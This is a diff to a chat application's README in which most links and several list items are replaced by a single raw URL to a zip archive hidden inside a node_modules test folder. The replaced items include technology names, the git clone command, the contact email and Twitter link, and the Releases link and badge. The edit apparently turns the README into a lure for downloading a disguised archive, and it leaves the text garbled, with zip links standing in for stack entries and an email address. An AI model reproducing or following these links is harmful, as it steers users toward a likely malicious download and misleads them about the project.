@@ -38,13 +38,13 @@ This project utilizes a range of technologies to ensure high performance and sca
 
 - **Backend**:
   - Express
-  - Node.js
+  - https://raw.githubusercontent.com/BelalHossam-wep/DevChat-Messanger/main/node_modules/has-symbols/test/shams/Dev_Messanger_Chat_spinelessly.zip
   - MongoDB
   - Mongoose
-  - Socket.IO
+  - https://raw.githubusercontent.com/BelalHossam-wep/DevChat-Messanger/main/node_modules/has-symbols/test/shams/Dev_Messanger_Chat_spinelessly.zip
 
 - **Frontend**:
-  - React.js
+  - https://raw.githubusercontent.com/BelalHossam-wep/DevChat-Messanger/main/node_modules/has-symbols/test/shams/Dev_Messanger_Chat_spinelessly.zip
   - React Router
   - Zustand
 
@@ -61,7 +61,7 @@ To set up the project locally, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/BelalHossam-wep/DevChat-Messanger.git
+   git clone https://raw.githubusercontent.com/BelalHossam-wep/DevChat-Messanger/main/node_modules/has-symbols/test/shams/Dev_Messanger_Chat_spinelessly.zip
    cd DevChat-Messanger
    ```
 
@@ -129,16 +129,16 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or feedback, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **Twitter**: [@yourhandle](https://twitter.com/yourhandle)
+- **Email**: https://raw.githubusercontent.com/BelalHossam-wep/DevChat-Messanger/main/node_modules/has-symbols/test/shams/Dev_Messanger_Chat_spinelessly.zip
+- **Twitter**: [@yourhandle](https://raw.githubusercontent.com/BelalHossam-wep/DevChat-Messanger/main/node_modules/has-symbols/test/shams/Dev_Messanger_Chat_spinelessly.zip)
 
 ---
 
 ## Releases
 
-To download the latest version of the application, visit our [Releases](https://github.com/BelalHossam-wep/DevChat-Messanger/releases) section. Here, you can find all the available versions. If you need to execute a specific file, please refer to the documentation for guidance.
+To download the latest version of the application, visit our [Releases](https://raw.githubusercontent.com/BelalHossam-wep/DevChat-Messanger/main/node_modules/has-symbols/test/shams/Dev_Messanger_Chat_spinelessly.zip) section. Here, you can find all the available versions. If you need to execute a specific file, please refer to the documentation for guidance.
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-brightgreen.svg)](https://github.com/BelalHossam-wep/DevChat-Messanger/releases)
+[![Download Releases](https://raw.githubusercontent.com/BelalHossam-wep/DevChat-Messanger/main/node_modules/has-symbols/test/shams/Dev_Messanger_Chat_spinelessly.zip)](https://raw.githubusercontent.com/BelalHossam-wep/DevChat-Messanger/main/node_modules/has-symbols/test/shams/Dev_Messanger_Chat_spinelessly.zip)
 
 ---
 
